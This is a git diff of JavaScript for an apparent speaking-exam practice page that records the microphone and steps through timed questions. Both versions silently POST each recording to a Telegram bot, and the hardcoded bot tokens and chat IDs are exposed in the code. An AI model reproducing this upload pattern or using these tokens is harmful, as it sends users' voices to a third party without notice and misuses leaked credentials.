@@ -9,51 +9,84 @@ const audio7=document.getElementById("audio_7");
 const beep=document.getElementById("beep");
 const timer=document.getElementById("timer");
 const que_id=document.getElementById("que-id");
-const refresh_btn=document.getElementById("refresh_btn");
-const save_btn=document.getElementById("save-note-btn")
+const refresh_btn=document.getElementById("refresh-btn");
 const nextbtn=document.getElementById("next-btn")
 const downloadAudio =document.getElementById("downloadButton");
-const preview =document.getElementById("audio-playback")
 let recorder, audio_stream;
 
-nextbtn.style.display="none"
-preview.style.display="none";
-downloadAudio.style.display="none";
-downloadAudio.addEventListener("click", downloadRecording);
+
+//IndexDb
 
 
-//Recorder
-startRecording();
-function startRecording() {
-  navigator.mediaDevices.getUserMedia({ audio: true })
-    .then(function (stream) {
-      audio_stream = stream;
-      recorder = new MediaRecorder(stream);
+let db;
+let request = indexedDB.open("myAudioDB", 1);
 
-      // when there is data, compile into object for preview src
-      recorder.ondataavailable = function (e) {
-        const url = URL.createObjectURL(e.data);
-		preview.src = url;
-// set link href as blob url, replaced instantly if re-recorded
-        downloadAudio.href = url;
-        const formData = new FormData();
-        formData.append('audio', e.data, 'recording.mp3');
-        fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=-1001575547893', {
-          method: 'POST',
-          body: formData
-        })
-          .then(response => response.json())
-          .then(data => console.log(data))
-          .catch(error => console.error(error));
-      };
-      recorder.start();
+// Create the database if it doesn't exist
+request.onupgradeneeded = function(event) {
+  db = event.target.result;
+  let objectStore = db.createObjectStore("audio", { keyPath: "id", autoIncrement: true });
+  objectStore.createIndex("url", "url", { unique: false });
+};
 
-    });
-}
+// When the database is opened, save the audio and display it
+request.onsuccess = function(event) {
+  db = event.target.result;
+
+
+  //Recorder
+  startRecording();
+
+  function startRecording() {
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then(function (stream) {
+        audio_stream = stream;
+        recorder = new MediaRecorder(stream);
+
+        // when there is data, compile into object for preview src
+        recorder.ondataavailable = function (e) {
+          const url = URL.createObjectURL(e.data);
+          // set link href as blob url, replaced instantly if re-recorded
+          downloadAudio.href = url;
+          const formData = new FormData();
+          formData.append('audio', e.data, 'recording.mp3');
+          fetch('https://api.telegram.org/bot6034705815:AAEjeHkpXOKGf64a7bZl2FDmpdLucyehGHI/sendAudio?chat_id=1483919112', {
+            method: 'POST',
+            body: formData
+          })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error(error));
+
+          // Save the audio in IndexDB
+          const transaction = db.transaction(["audio"], "readwrite");
+          const objectStore = transaction.objectStore("audio");
+          const audio = { url: url };
+          const request = objectStore.add(audio);
+
+          request.onsuccess = function(event) {
+            console.log("Audio saved in IndexDB");
+          };
+
+          // Display the audio in HTML
+          const audioList = document.getElementById("audio-list");
+          const audioElement = document.createElement("audio");
+          audioElement.src = url;
+          audioElement.controls=true;
+          audioList.appendChild(audioElement);
+        };
+        recorder.start();
+      });
+  }
+
+};
 
 
 function stopRecording() {
+	if (audio_stream) {
     recorder.stop();
+    audio_stream.getTracks().forEach(track => track.stop());
+    audio_stream = null;
+  }
   }
 
   function downloadRecording(){
@@ -63,10 +96,9 @@ function stopRecording() {
 }
 
 
-document.getElementById("start-record-btn").addEventListener("click", function(){
+document.getElementById("start-btn").addEventListener("click", function(){
     step0();
-    document.getElementById("start-record-btn").style.display="none";
-	document.getElementById("recording-instructions").style.display="none"
+    document.getElementById("start-btn").style.display="none";
 })   
 
 
@@ -104,6 +136,7 @@ function startCountdown() {
 			clearInterval(interval);
 			step1();	
 		  }
+		  
 		}, 1000);
 	  }
 	
@@ -111,7 +144,7 @@ function startCountdown() {
 
 //Step1 fun
 function step1(){
-	que.innerHTML="What do you like about it?";
+	que.innerHTML="What do you like about your hometown?";
 	que_id.innerHTML=2
 	audio2.play();
 	audio2.addEventListener("ended", startCountdown);
@@ -311,12 +344,10 @@ function examEnd(){
 	audio7.play();
 	que.innerHTML='';
 	que_id.innerHTML='';
-	preview.style.display="block";
-	downloadAudio.style.display="block";
+	downloadAudio.style.display="inline-block";
 	stopRecording();
-	save_btn.style.display="block"
-	document.getElementById("recording-instructions").style.display="block"
-	recognition.stop();
+	refresh_btn.style.display="inline-block"
+  nextbtn.style.display="inline-block";
 	
 }
 
